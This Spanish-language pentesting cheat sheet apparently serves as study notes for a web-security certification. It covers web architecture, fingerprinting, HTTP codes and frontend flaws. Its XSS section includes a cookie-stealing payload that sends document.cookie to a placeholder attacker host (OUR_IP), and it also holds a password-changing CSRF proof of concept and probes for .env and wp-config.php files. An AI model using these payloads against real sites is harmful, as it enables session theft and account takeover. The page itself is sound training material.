---
title: "Introduction to Web Applications"
description: "Arquitectura web, tecnologías, HTTP, cookies y seguridad básica."
sidebar:
  order: 5
  label: "Introduction to Web Applications"
---
> Arquitectura de aplicaciones web, tecnologías frontend/backend, y vulnerabilidades fundamentales. Base conceptual para todos los demás módulos CWES.

---


## Arquitectura web — Modelos comunes

| Modelo | Descripción | Riesgo |
|--------|-------------|--------|
| **One Server** | Todo en un servidor | All-in-one: un fallo = todo comprometido |
| **Many Servers - One DB** | Varios app servers, una BD | Segmentación parcial |
| **Many Servers - Many DBs** | Totalmente distribuido | Mayor seguridad, más difícil de comprometer |
| **Microservices** | Componentes independientes stateless | Superficie de ataque ampliada por más endpoints |
| **Serverless** | Funciones en containers cloud | Difícil de persistir, exfiltración via API |

### Tres capas de la arquitectura (Three Tier)

| Capa | Tecnologías | Qué atacar |
|------|-------------|------------|
| **Presentation** | HTML, CSS, JS, React, Angular | XSS, HTML Injection, JS client-side |
| **Application** | PHP, Python, Java, .NET, Node.js | SQLi, LFI, RCE, auth bypass |
| **Data** | MySQL, PostgreSQL, MongoDB, Redis | SQLi, NoSQLi, data exposure |

---

## Web Servers — Identificación

| Web Server | Puerto | Identificadores |
|------------|--------|-----------------|
| **Apache** | 80/443 | `Server: Apache/2.x.x`, `.htaccess`, `/server-status` |
| **NGINX** | 80/443 | `Server: nginx/1.x.x`, configuración en `/etc/nginx/` |
| **IIS** | 80/443 | `Server: Microsoft-IIS/10.0`, extensiones `.aspx`, `.asp` |
| **Tomcat** | 8080/8443 | `/manager/html`, archivos `.jsp`, `.war` |
| **Node.js** | varía | `X-Powered-By: Express`, JSON responses, `.js` endpoints |

```bash
# Identificar web server via headers
curl -I http://TARGET/
# Buscar: Server, X-Powered-By, X-Generator, Content-Type

# Whatweb — fingerprinting
whatweb http://TARGET/

# Wappalyzer (extensión de Firefox/Chrome) — tecnologías detectadas
```

---

## Bases de datos — Tipos e identificación

| Tipo | BD | Identificación | Inyección |
|------|----|----------------|-----------|
| **SQL** | MySQL | `MySQL error`, puerto 3306, `information_schema` | SQLi |
| **SQL** | MSSQL | IIS + `.aspx`, puerto 1433, `@@version` | SQLi |
| **SQL** | PostgreSQL | `pg_` prefijos, puerto 5432 | SQLi |
| **SQL** | SQLite | Archivos `.db`, `.sqlite3`, apps pequeñas | SQLi |
| **NoSQL** | MongoDB | Puerto 27017, respuestas JSON, `$where` | NoSQLi |
| **NoSQL** | Redis | Puerto 6379, `KEYS *` sin auth | SSRF, auth bypass |

---

## Stacks tecnológicos comunes

| Stack | Componentes | Qué buscar |
|-------|-------------|------------|
| **LAMP** | Linux + Apache + MySQL + PHP | PHP shells, SQLi, LFI en `?page=` |
| **MEAN** | MongoDB + Express + Angular + Node | NoSQLi, prototype pollution |
| **WINS** | Windows + IIS + .NET + SQL Server | ASPX upload, MSSQL xp_cmdshell |
| **Django** | Python + PostgreSQL | SSTI en templates, Python deserialization |
| **Laravel** | PHP + MySQL | SQLi, debug mode RCE |

---

## HTTP Response Codes — Referencia rápida

| Código | Significado | Implicación para pentest |
|--------|-------------|--------------------------|
| `200 OK` | Éxito | Recurso existe y es accesible |
| `301/302` | Redirect | Seguir la cadena, puede revelar paths |
| `400` | Bad Request | Revisar sintaxis del payload |
| `401` | Unauthorized | Auth requerida → probar bypass |
| `403` | Forbidden | Recurso existe → probar bypass de acceso |
| `404` | Not Found | No existe (o hidden) |
| `405` | Method Not Allowed | Probar otros HTTP verbs |
| `500` | Internal Server Error | Error de servidor → puede revelar stack trace |
| `502/504` | Gateway Error | Proxy/load balancer en medio |

```bash
# Verificar código de respuesta
curl -s -o /dev/null -w "%{http_code}" http://TARGET/path
```

---

## Vulnerabilidades Frontend — Referencia

### Sensitive Data Exposure (SDE)

```bash
# Revisar código fuente
curl -s http://TARGET/ | grep -iE "password|secret|key|token|api|TODO|FIXME|admin"

# View source en browser: Ctrl+U o view-source:http://TARGET/
# Buscar en comentarios HTML: <!-- ... -->
# Buscar archivos .bak, .old, .swp, editor temporales
curl http://TARGET/.htpasswd
curl http://TARGET/config.php.bak
curl http://TARGET/index.php~

# Archivos de configuración comunes
curl http://TARGET/.env
curl http://TARGET/config.js
curl http://TARGET/wp-config.php
```

### HTML Injection → XSS

| Tipo XSS | Dónde | Payload básico |
|----------|-------|----------------|
| **Reflected** | Parámetro GET/POST mostrado directamente | `<script>alert(1)</script>` |
| **Stored** | Comentario/perfil guardado en BD | `<img src=x onerror=alert(document.cookie)>` |
| **DOM** | JS manipula el DOM con input del usuario | `#"><img src=/ onerror=alert(document.cookie)>` |

```javascript
// Probar XSS básico
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)

// Robar cookie (stored XSS)
<script>new Image().src='http://OUR_IP/steal?c='+document.cookie</script>

// CSRF via XSS
"><script src=http://OUR_IP/exploit.js></script>
```

### CSRF

```html
<!-- PoC básico de CSRF -->
<form action="http://TARGET/change-password" method="POST">
  <input type="hidden" name="password" value="hacked123">
  <input type="hidden" name="confirm" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

---

## Conceptos clave de seguridad web

### URL Encoding — Tabla de referencia

| Caracter | Encoding | Uso en ataques |
|----------|----------|----------------|
| espacio | `%20` o `+` | Bypass de filtros de palabras |
| `'` | `%27` | SQLi sin quote |
| `"` | `%22` | XSS bypass |
| `<` | `%3C` | XSS bypass |
| `>` | `%3E` | XSS bypass |
| `/` | `%2F` | Path traversal bypass |
| `&` | `%26` | Separador de parámetros |
| `#` | `%23` | Comentario SQL |
| `=` | `%3D` | Parámetros |
| `\n` | `%0A` | Command injection |

```bash
# Encode/decode URL con Python
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1--\"))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('%27%20OR%201%3D1--'))"
```

### DOM — Conceptos relevantes

```javascript
// Acceso a elementos DOM (para XSS)
document.getElementById("id")
document.getElementsByClassName("class")
document.cookie                    // sesión del usuario
document.location                  // URL actual
document.referrer                  // página anterior
window.localStorage                // almacenamiento local
```

---

## OWASP Top 10 — Mapa de módulos CWES

| # | Vulnerabilidad | Módulo CWES |
|---|---------------|-------------|
| 1 | Broken Access Control | [Broken Authentication](/metodologias/web/broken-authentication/) |
| 2 | Cryptographic Failures | [Broken Authentication](/metodologias/web/broken-authentication/) |
| 3 | Injection (SQLi, SSTI, CMDi) | [Server-side Attacks](/metodologias/web/server-side-attacks/) |
| 4 | Insecure Design | [API Attacks](/metodologias/web/api-attacks/) |
| 5 | Security Misconfiguration | [Web Fuzzing](/metodologias/recon/web-fuzzing/) |
| 6 | Vulnerable & Outdated Components | [Bug Bounty Hunting Process](/metodologias/web/bug-bounty-hunting-process/) |
| 7 | Identification & Auth Failures | [Broken Authentication](/metodologias/web/broken-authentication/) |
| 8 | Software & Data Integrity Failures | [API Attacks](/metodologias/web/api-attacks/), [Attacking GraphQL](/metodologias/web/attacking-graphql/) |
| 9 | Security Logging Failures | [Bug Bounty Hunting Process](/metodologias/web/bug-bounty-hunting-process/) |
| 10 | SSRF | [Server-side Attacks](/metodologias/web/server-side-attacks/) |

---

## Fingerprinting rápido de tecnología

```bash
# Headers HTTP
curl -sI http://TARGET/ | grep -iE "server|x-powered|content-type|set-cookie|x-generator"

# HTML meta tags
curl -s http://TARGET/ | grep -iE "<meta|generator|framework|cms"

# Archivos reveladores
curl -s http://TARGET/robots.txt          # paths permitidos/prohibidos
curl -s http://TARGET/sitemap.xml         # estructura del sitio
curl -s http://TARGET/README.md           # info del proyecto
curl -s http://TARGET/CHANGELOG.md        # versiones
curl -s http://TARGET/package.json        # dependencias Node.js
curl -s http://TARGET/composer.json       # dependencias PHP
curl -s http://TARGET/requirements.txt    # dependencias Python
```

---

## Pitfalls / Gotchas

- **SDE en comentarios HTML:** siempre Ctrl+U antes de cualquier otra acción. Las credenciales de prueba en comentarios son más comunes de lo que parece.
- **403 ≠ no existe:** un 403 confirma que el recurso existe. Intentar bypass con métodos alternativos, headers (`X-Original-URL`, `X-Rewrite-URL`) o path normalization.
- **JS frameworks ocultan la lógica:** Angular, React, Vue renderizan en cliente → inspeccionar el bundle JS para encontrar endpoints API.
- **NoSQL ≠ inmune a inyección:** MongoDB tiene su propia sintaxis de inyección (`$where`, `$gt`, `$regex`).
- **CSRF tokens:** verificar si el token se valida en el servidor. A veces solo se genera en cliente (JS) sin validación server-side.
- **SameSite cookie:** `SameSite=Strict` mitiga CSRF pero no XSS. `SameSite=Lax` permite CSRF con GET de top-level navigation.
- **`robots.txt` no es seguridad:** listа los paths que los bots NO deben indexar → son pistas directas de paths sensibles.

---

## Cheatsheets relacionados

- [Web Requests](/metodologias/fundamentos/web-requests/) — HTTP en profundidad, cURL, headers, autenticación
- [Web Fuzzing](/metodologias/recon/web-fuzzing/) — descubrimiento de paths, parámetros y tecnología
- [JavaScript Deobfuscation](/metodologias/recon/javascript-deobfuscation/) — análisis de código JS del frontend
- [Server-side Attacks](/metodologias/web/server-side-attacks/) — SSRF, SSTI y otras vulnerabilidades backend
- [Broken Authentication](/metodologias/web/broken-authentication/) — sesiones, cookies, JWT, MFA bypass
